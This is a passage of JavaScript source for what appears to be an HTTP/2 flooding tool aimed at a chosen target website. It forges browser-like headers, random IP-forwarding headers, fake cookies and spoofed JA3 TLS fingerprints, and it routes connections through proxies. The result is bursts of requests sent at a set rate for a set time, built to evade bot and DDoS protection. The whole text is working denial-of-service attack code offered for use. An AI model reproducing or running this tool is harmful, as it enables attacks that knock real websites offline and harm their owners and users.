    )}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
    "x-forwarded-proto": "https",
    "x-forwarded-scheme": "https",

    "upgrade-insecure-requests": "1",
    "cache-control": "no-cache",
    "dnt": "1",

    // Header tambahan Safari/WebKit fingerprint valid
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "none",
    "sec-fetch-user": "?1",

    // Safari tidak pakai sec-ch-ua, tapi kirim viewport/device hint kadang
    "viewport-width": `${Math.floor(Math.random() * (1920 - 768) + 768)}`,
    "device-memory": `${Math.pow(2, Math.floor(Math.random() * 4 + 2))}`, // 2–16
    "downlink": `${(Math.random() * 8 + 2).toFixed(1)}`,
    "rtt": `${Math.floor(Math.random() * 200) + 100}`,
    "ect": ["4g", "3g", "slow-2g"][Math.floor(Math.random() * 3)],

    // Cookie ringan (opsional)
    "cookie": `_cfuvid=${generateRandomString(16)}; theme=safari`
  },
  mobile: {
    ":method": "GET",
    ":authority": Math.random() < 0.65 
            ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
            : (Math.random() < 0.4 ? "www." : Math.random() < 0.3 ? "cdn." : Math.random() < 0.2 ? "img." : "static.") + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
        ":scheme": "https",
        ":path": parsedTarget.path + "?" + generateRandomString(6) + "=" + generateRandomString(12, 20) +
            "&" + generateRandomString(5) + "=" + generateRandomString(10, 18) +
            "&" + generateRandomString(4) + "=" + generateRandomString(8, 16) +
            "&cb=" + Date.now(),

    "sec-ch-ua": `"Not.A/Brand";v="99", "Chromium";v="${Math.floor(115 + Math.random() * 10)}", "Google Chrome";v="${Math.floor(115 + Math.random() * 10)}"`,
    "sec-ch-ua-mobile": "?1",
    "sec-ch-ua-platform": `"Android"`,

    "user-agent": `Mozilla/5.0 (Linux; Android ${Math.floor(10 + Math.random() * 4)}; ${["SM-G998B", "Pixel 7", "Mi 11", "OnePlus 9", "RMX3081"][Math.floor(Math.random() * 5)]}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(
      115 + Math.random() * 10
    )}.0.${Math.floor(Math.random() * 4000)}.0 Mobile Safari/537.36`,

    "accept":
      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "accept-language":
      Math.random() < 0.5
        ? "en-US,en;q=0.9"
        : "id-ID,id;q=0.9,en;q=0.8",
    "accept-encoding": "gzip, deflate, br, zstd",

    "referer":
      Math.random() < 0.5
        ? "https://m.google.com/"
        : `https://${parsedTarget.host}/`,

    "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(
      Math.random() * 255
    )}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
    "x-real-ip": `${Math.floor(Math.random() * 255)}.${Math.floor(
      Math.random() * 255
    )}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
    "x-forwarded-proto": "https",
    "x-forwarded-scheme": "https",

    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    "sec-fetch-user": "?1",

    "upgrade-insecure-requests": "1",
    "cache-control": "no-cache",
    "dnt": "1",

    // Tambahan fingerprint natural mobile
    "viewport-width": `${Math.floor(Math.random() * (720 - 320) + 320)}`,
    "device-memory": `${[2, 4, 6, 8][Math.floor(Math.random() * 4)]}`,
    "downlink": `${(Math.random() * 4 + 1.5).toFixed(1)}`, // e.g. 1.5–5.5 Mbps
    "rtt": `${Math.floor(Math.random() * 200) + 100}`, // 100–300ms
    "ect": ["4g", "3g", "2g", "slow-2g"][Math.floor(Math.random() * 4)],

    // Cookie ringan (opsional)
    "cookie": `_ga=${generateRandomString(10)}; sessionid=${generateRandomString(16)}`
  },
  firefox: {
    ":method": "GET",
    ":authority": Math.random() < 0.65 
            ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
            : (Math.random() < 0.4 ? "www." : Math.random() < 0.3 ? "cdn." : Math.random() < 0.2 ? "img." : "static.") + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
        ":scheme": "https",
        ":path": parsedTarget.path + "?" + generateRandomString(6) + "=" + generateRandomString(12, 20) +
            "&" + generateRandomString(5) + "=" + generateRandomString(10, 18) +
            "&" + generateRandomString(4) + "=" + generateRandomString(8, 16) +
            "&cb=" + Date.now(),

    "user-agent": `Mozilla/5.0 (${["Windows NT 10.0", "X11; Linux x86_64", "Macintosh; Intel Mac OS X 10.15"][Math.floor(Math.random() * 3)]}; rv:${Math.floor(
      110 + Math.random() * 20
    )}.0) Gecko/20100101 Firefox/${Math.floor(110 + Math.random() * 20)}.0`,

    "accept":
      "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "accept-language":
      Math.random() < 0.5
        ? "en-US,en;q=0.9"
        : "id-ID,id;q=0.9,en;q=0.8",
    "accept-encoding": "gzip, deflate, br",

    "referer":
      Math.random() < 0.5
        ? "https://www.mozilla.org/"
        : `https://${parsedTarget.host}/`,

    "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(
      Math.random() * 255
    )}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
    "x-real-ip": `${Math.floor(Math.random() * 255)}.${Math.floor(
      Math.random() * 255
    )}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
    "x-forwarded-proto": "https",
    "x-forwarded-scheme": "https",

    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    "sec-fetch-user": "?1",

    "upgrade-insecure-requests": "1",
    "cache-control": "no-cache",
    "dnt": "1",

    // Header Firefox valid tambahan
    "te": "trailers", // Firefox masih kirim TE: trailers
    "connection": "keep-alive",

    // Cookie ringan
    "cookie": `_ga=${generateRandomString(10)}; lang=en-US; ffid=${generateRandomString(12)}`
  },
  opera: {
    ":method": "POST",
    ":authority": Math.random() < 0.65 
            ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
            : (Math.random() < 0.4 ? "www." : Math.random() < 0.3 ? "cdn." : Math.random() < 0.2 ? "img." : "static.") + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
        ":scheme": "https",
        ":path": parsedTarget.path + "?" + generateRandomString(6) + "=" + generateRandomString(12, 20) +
            "&" + generateRandomString(5) + "=" + generateRandomString(10, 18) +
            "&" + generateRandomString(4) + "=" + generateRandomString(8, 16) +
            "&cb=" + Date.now(),

    "sec-ch-ua": `"Not.A/Brand";v="99", "Chromium";v="${Math.floor(115 + Math.random() * 10)}", "Opera";v="${Math.floor(100 + Math.random() * 20)}"`,
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": `"Windows"`,

    "user-agent": `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(
      115 + Math.random() * 10
    )}.0.${Math.floor(Math.random() * 5000)}.0 Safari/537.36 OPR/${Math.floor(100 + Math.random() * 20)}.0.0.0`,

    "accept":
      "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "accept-language":
      Math.random() < 0.5
        ? "en-US,en;q=0.9"
        : "id-ID,id;q=0.9,en;q=0.8",
    "accept-encoding": "gzip, deflate, br, zstd",

    "referer":
      Math.random() < 0.5
        ? "https://www.opera.com/"
        : `https://${parsedTarget.host}/`,

    "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(
      Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
    "x-real-ip": `${Math.floor(Math.random() * 255)}.${Math.floor(
      Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
    "x-forwarded-proto": "https",
    "x-forwarded-scheme": "https",

    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    "sec-fetch-user": "?1",

    "upgrade-insecure-requests": "1",
    "cache-control": "no-cache",
    "dnt": "1",

    // Tambahan fingerprint network dan device hint
    "device-memory": `${[2, 4, 8, 16][Math.floor(Math.random() * 4)]}`,
    "rtt": `${Math.floor(Math.random() * 200) + 100}`,
    "downlink": `${(Math.random() * 10 + 1).toFixed(1)}`,
    "ect": ["4g", "3g", "slow-2g"][Math.floor(Math.random() * 3)],

    // Cookie ringan (opsional)
    "cookie": `_ga=${generateRandomString(12)}; session_opr=${generateRandomString(16)}`
  },
  operagx: {
    ":method": "POST",
    ":authority": Math.random() < 0.65 
            ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
            : (Math.random() < 0.4 ? "www." : Math.random() < 0.3 ? "cdn." : Math.random() < 0.2 ? "img." : "static.") + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
        ":scheme": "https",
        ":path": parsedTarget.path + "?" + generateRandomString(6) + "=" + generateRandomString(12, 20) +
            "&" + generateRandomString(5) + "=" + generateRandomString(10, 18) +
            "&" + generateRandomString(4) + "=" + generateRandomString(8, 16) +
            "&cb=" + Date.now(),

    "sec-ch-ua": `"Not.A/Brand";v="99", "Chromium";v="${Math.floor(115 + Math.random() * 10)}", "Opera GX";v="${Math.floor(100 + Math.random() * 20)}"`,
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": `"Windows"`,

    "user-agent": `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(
      115 + Math.random() * 10
    )}.0.${Math.floor(Math.random() * 5000)}.0 Safari/537.36 OPR/${Math.floor(100 + Math.random() * 20)}.0.0.0 (GX)`,

    "accept":
      "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.7",
    "accept-language":
      Math.random() < 0.5
        ? "en-US,en;q=0.9"
        : "id-ID,id;q=0.9,en;q=0.8",
    "accept-encoding": "gzip, deflate, br, zstd",

    "referer":
      Math.random() < 0.5
        ? "https://www.opera.com/gx"
        : `https://${parsedTarget.host}/`,

    "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(
      Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
    "x-real-ip": `${Math.floor(Math.random() * 255)}.${Math.floor(
      Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
    "x-forwarded-proto": "https",
    "x-forwarded-scheme": "https",

    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    "sec-fetch-user": "?1",

    "upgrade-insecure-requests": "1",
    "cache-control": "no-cache",
    "dnt": "1",

    // Tambahan header realistis
    "device-memory": `${[4, 8, 16][Math.floor(Math.random() * 3)]}`,
    "rtt": `${Math.floor(Math.random() * 200) + 100}`,
    "downlink": `${(Math.random() * 5 + 1.5).toFixed(1)}`,
    "ect": ["4g", "3g", "slow-2g"][Math.floor(Math.random() * 3)],

    // Cookie simulasi pengguna aktif
    "cookie": `theme=dark; gxmode=on; _ga=${generateRandomString(10)}; session_id=${generateRandomString(12)}`
  },
  duckduckgo: {
    ":method": "GET",
    ":authority": Math.random() < 0.65 
            ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
            : (Math.random() < 0.4 ? "www." : Math.random() < 0.3 ? "cdn." : Math.random() < 0.2 ? "img." : "static.") + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
        ":scheme": "https",
        ":path": parsedTarget.path + "?" + generateRandomString(6) + "=" + generateRandomString(12, 20) +
            "&" + generateRandomString(5) + "=" + generateRandomString(10, 18) +
            "&" + generateRandomString(4) + "=" + generateRandomString(8, 16) +
            "&cb=" + Date.now(),

    "sec-ch-ua": `"Not.A/Brand";v="99", "Chromium";v="${Math.floor(114 + Math.random() * 10)}", "DuckDuckGo";v="${Math.floor(5 + Math.random() * 3)}"`,
    "sec-ch-ua-mobile": "?1",
    "sec-ch-ua-platform": `"Android"`,

    "user-agent": `Mozilla/5.0 (Linux; Android ${Math.floor(10 + Math.random() * 4)}; ${["SM-A515F", "Pixel 6", "Moto G Power", "OnePlus 8"][Math.floor(Math.random() * 4)]}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(
      114 + Math.random() * 10
    )}.0.${Math.floor(Math.random() * 5000)}.0 Mobile Safari/537.36 DuckDuckGo/${Math.floor(5 + Math.random() * 3)}`,

    "accept":
      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "accept-language":
      Math.random() < 0.5
        ? "en-US,en;q=0.9"
        : "id-ID,id;q=0.9,en;q=0.8",
    "accept-encoding": "gzip, deflate, br",

    "referer":
      Math.random() < 0.5
        ? "https://duckduckgo.com/"
        : `https://${parsedTarget.host}/`,

    "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(
      Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
    "x-real-ip": `${Math.floor(Math.random() * 255)}.${Math.floor(
      Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
    "x-forwarded-proto": "https",
    "x-forwarded-scheme": "https",

    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    "sec-fetch-user": "?1",

    "upgrade-insecure-requests": "1",
    "cache-control": "no-cache",
    "dnt": "1",

    // Fingerprint natural dari mobile browser
    "viewport-width": `${Math.floor(Math.random() * (720 - 360) + 360)}`,
    "device-memory": `${[2, 3, 4, 6][Math.floor(Math.random() * 4)]}`,
    "rtt": `${Math.floor(Math.random() * 250) + 100}`,
    "downlink": `${(Math.random() * 6 + 1).toFixed(1)}`,
    "ect": ["4g", "3g", "2g"][Math.floor(Math.random() * 3)],

    // Cookie privasi ringan
    "cookie": `ddg_fp=${generateRandomString(12)}; privacy_mode=on`
  }
};

    return headersMap[browser];
};
const browser = getRandomBrowser();
const headers = generateHeaders(browser);
let h2_config;
const h2settings = h2Settings(browser);
h2_config = transformSettings(Object.entries(h2settings));
function getWeightedRandom() {
    const randomValue = Math.random() * Math.random();
    return randomValue < 0.25;
}
const randomString = randstr(10);

                        const headers4 = {
                            ...(getWeightedRandom() && Math.random() < 0.4 && { 'x-forwarded-for': `${randomString}:${randomString}` }),
                            ...(getWeightedRandom() && { 'referer': `https://${randomString}.com` })
                        }

                        let allHeaders = Object.assign({}, headers, headers4);


const proxyOptions = {
    host: parsedProxy[0],
    port: ~~parsedProxy[1],
    address: `${parsedTarget.host}:443`,
    timeout: 1000
};

Socker.HTTP(proxyOptions, async (connection, error) => {
    if (error) return;
    connection.setKeepAlive(true, 6000000);
    connection.setNoDelay(true);

    const settings = {
        initialWindowSize: 15663105,
    };

    const tlsOptions = {
        secure: true,
        ALPNProtocols: ["h2", "http/1.1", "h3", "spdy/1.3"],
        ciphers: "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384",
        requestCert: true,
        sigalgs: "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384",
        socket: connection,
        ecdhCurve: "X25519:prime256v1:secp384r1",
        secureContext: secureContext,
        honorCipherOrder: false,
        rejectUnauthorized: false,
        secureProtocol: Math.random() < 0.5 ? 'TLSv1_2_method' : 'TLSv1_3_method',
        secureOptions: secureOptions,
        host: parsedTarget.host,
        servername: parsedTarget.host,
    };
    
    const tlsSocket = tls.connect(parsedPort, parsedTarget.host, tlsOptions);
    
    tlsSocket.allowHalfOpen = true;
    tlsSocket.setNoDelay(true);
    tlsSocket.setKeepAlive(true, 60000);
    tlsSocket.setMaxListeners(0);
    
    const ja3Fingerprints = {
  chrome: {
    version: 771,
    ciphers: [4865,4866,4867,49195,49199,49196,49200,52393,52392],
    extensions: [0,11,10,35,16,23,13,45,51,43,34,5,27,17513,65281],
    curves: [257,29,23,24], 
    ecPointFormats: [0]
  },
  brave: {
    version: 771,
    ciphers: [4867,4865,4866,49195,49199,49196,49200,52393,52392],
    extensions: [0,11,10,35,16,23,13,45,43,51,34,17513,5,27,65281],
    curves: [257,29,23,24],
    ecPointFormats: [0]
  },
  firefox: {
    version: 771,
    ciphers: [4865,4866,4867,49195,49199,49196,49200,52393,52392,49171,49172],
    extensions: [0,11,10,35,13,16,5,23,43,51,45,21,27,28,17513,65281],
    curves: [257,29,23,24,25],
    ecPointFormats: [0]
  },
  safari: {
    version: 771,
    ciphers: [4865,4866,4867,49195],
    extensions: [0,11,10,35,13,16,5,23],
    curves: [29,23],
    ecPointFormats: [0]
  },
  mobile: {
    version: 771,
    ciphers: [4865,4866,4867,49195,49196],
    extensions: [0,11,10,35,13,16,23,5],
    curves: [29,23],
    ecPointFormats: [0]
  }
};

function generateSpoofedJA3(browser = 'chrome') {
  const profile = ja3Fingerprints[browser];
  if (!profile) throw new Error(`JA3 profile for ${browser} not found`);

  const ja3String = [
    profile.version,
    profile.ciphers.join('-'),
    profile.extensions.join('-'),
    profile.curves.join('-'),
    profile.ecPointFormats.join('-')
  ].join(',');

  const hash = crypto.createHash("md5").update(ja3String).digest("hex");

  return {
    browser,
    ja3: ja3String,
    hash
  };
}
["chrome", "brave", "firefox", "safari", "mobile"].forEach(browser => {
  const { ja3, hash } = generateSpoofedJA3(browser);
  console.log(`🔎 ${browser.toUpperCase()} JA3:\n  ➤ String: ${ja3}\n  ➤ Hash:   ${hash}\n`);
});
    let hpack = new HPACK();
let client;

client = http2.connect(parsedTarget.href, {
    protocol: "https",
    createConnection: () => tlsSocket,
    settings: h2settings,
    socket: tlsSocket,
});

client.setMaxListeners(0);

const updateWindow = Buffer.alloc(4);
updateWindow.writeUInt32BE(Math.floor(Math.random() * (19963105 - 15663105 + 1)) + 15663105, 0);

client.on('remoteSettings', () => {
    const localWindowSize = Math.floor(Math.random() * (19963105 - 15663105 + 1)) + 15663105;
    client.setLocalWindowSize(localWindowSize, 0);
});

const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
const frames = [
    Buffer.from(PREFACE, 'binary'),
    encodeFrame(0, 4, encodeSettings([...h2_config])),
    encodeFrame(0, 8, updateWindow)
];

client.on('connect', async () => {
    const intervalId = setInterval(async () => {

        const shuffleObject = (obj) => {
            const keys = Object.keys(obj);
            for (let i = keys.length - 1; i > 0; i--) {
                const j = Math.floor(Math.random() * (i + 1));
                [keys[i], keys[j]] = [keys[j], keys[i]];
            }
            const shuffledObj = {};
            keys.forEach(k => shuffledObj[k] = obj[k]);
            return shuffledObj;
        };

        const randomItem = (array) => array[Math.floor(Math.random() * array.length)];

        const dynHeaders = shuffleObject({
            ...allHeaders,

            ...(Math.random() < 0.5 ? {
                "Cache-Control": "max-age=0"
            } : {}),

            ...(Math.random() < 0.45 ? {
                ["x-request-id"]: crypto.randomUUID()
            } : {}),

            ...(Math.random() < 0.4 ? {
                ["x-amzn-trace-id"]: `Root=1-${Date.now().toString(16)}-${generateRandomString(24)}`
            } : {}),

            ...(Math.random() < 0.4 ? {
                ["cf-ray"]: `${Math.random().toString(36).slice(2, 18)}-SIN`
            } : {}),

            ...(Math.random() < 0.5
                ? {
                    ["MOMENT" + randstr(4)]: "POLOM" + generateRandomString(1, 5)
                }
                : {
                    ["X-FRAMES" + generateRandomString(1, 4)]: "NAVIGATE" + randstr(3)
                })
        });

        const packed = Buffer.concat([
            Buffer.from([0x80, 0, 0, 0, 0xFF]),
            hpack.encode(dynHeaders)
        ]);

        const streamId = 1;
        const requests = [];
        let count = 0;

        if (tlsSocket && !tlsSocket.destroyed && tlsSocket.writable) {
            for (let i = 0; i < args.Rate; i++) {
                const requestPromise = new Promise((resolve, reject) => {
                    const req = client.request(dynHeaders)
                        .on('response', () => {
                            req.close();
                            req.destroy();
                            resolve();
                        });

                    req.on('end', () => {
                        count++;
                        if (count === args.time * args.Rate) {
                            clearInterval(intervalId);
                            client.close(http2.constants.NGHTTP2_CANCEL);
                        }
                        reject(new Error('Request timed out'));
                    });

                    req.end();
                });

                const frame = encodeFrame(streamId, 1, packed, 0x1 | 0x4 | 0x20);
                requests.push({ requestPromise, frame });
            }

            await Promise.all(requests.map(({ requestPromise }) => requestPromise));
            client.write(Buffer.concat(frames));
        }

    }, 950);
});
    
        client.on("close", () => {
            client.destroy();
            connection.destroy();
            return;
        });

        client.on("error", error => {
            client.destroy();
            connection.destroy();
            return;
        });
        });
    }
const StopScript = () => process.exit(1);

setTimeout(StopScript, args.time * 1000);

process.on('uncaughtException', error => {});
process.on('unhandledRejection', error => {});

